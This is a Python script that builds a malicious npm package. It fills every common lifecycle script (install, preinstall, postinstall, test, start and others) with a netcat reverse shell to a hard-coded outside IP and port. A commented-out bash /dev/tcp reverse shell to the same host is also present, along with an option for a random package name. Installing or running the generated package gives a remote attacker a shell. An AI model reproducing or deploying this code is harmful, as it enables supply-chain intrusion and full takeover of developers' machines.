import os
import json
import stat 
import sys
import argparse
import base64

parser = argparse.ArgumentParser(description="Generate an evil NPM mod")
parser.add_argument("--gen-name",default=False,action="store_const",const=True)

args = parser.parse_args()


prefixable_events = [
    "syndistest", # custom
    "lint",
    "install",
    "prepare",
    "publish",
    "pack",
    "restart",
    "start",
    "stop",
    "test",
    "uninstall",
    "version",
    "serve",
    "shrinkwrap"
]

non_prefixable_events = [
    "prepublishOnly"
]

#script_template = lambda event: f"bash -i >& /dev/tcp/137.184.94.106/1337 0>&1"
script_template = lambda event: f"mkfifo {event}.fifo; nc 137.184.94.106 1337 < {event}.fifo | /bin/bash > {event}.fifo 2>&1; rm {event}.fifo"
#script_template = lambda event,method: expression_template("nslookup",event,method) + expression_template("dig",event,method) + expression_template("curl",event,method)

os.makedirs('node_modules',exist_ok=True)
os.makedirs('node_modules/.hooks',exist_ok=True)

package_name = "syndis_node_tests"

if args.gen_name:
    import string, random
    package_name = "".join([random.choice(string.ascii_lowercase) for n in range(10)])

package_json_dict = {'name':package_name,'version':'1.0.0','description':'','main':'index.js'}

def write_hook(event):
    path = f"node_modules/.hooks/{event}"
    with open(path,"w") as f:
        f.write("#!/usr/bin/env bash\n")
        f.write(script_template(event,"hook"))
    file_stats = os.stat(path)
    os.chmod(path,file_stats.st_mode | stat.S_IEXEC)

scripts = {}
for event in prefixable_events:
    scripts[event] = script_template(event)
    #write_hook(event)
    for prefix in ["pre","post"]:
        scripts[prefix+event] = script_template(prefix+event)
        #write_hook(prefix+event)
package_json_dict["scripts"] = scripts

with open("package.json","w") as f:
    json.dump(package_json_dict,f)
